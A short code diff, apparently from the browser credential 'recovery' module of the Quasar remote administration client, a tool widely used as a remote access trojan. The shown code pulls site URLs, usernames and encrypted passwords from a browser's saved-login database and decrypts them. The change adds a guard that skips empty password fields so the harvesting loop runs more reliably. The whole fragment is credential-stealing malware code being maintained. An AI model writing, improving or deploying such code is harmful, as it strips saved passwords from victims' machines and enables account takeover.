@@ -54,7 +54,14 @@ namespace Quasar.Client.Recovery.Browsers
                     {
                         var host = sqlDatabase.GetValue(i, "origin_url");
                         var user = sqlDatabase.GetValue(i, "username_value");
-                        var pass = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));
+                        var value = sqlDatabase.GetValue(i, "password_value");
+
+                        if (value == "")
+                        {
+                            continue;
+                        }
+
+                        var pass = decryptor.Decrypt(value);
 
                         if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                         {
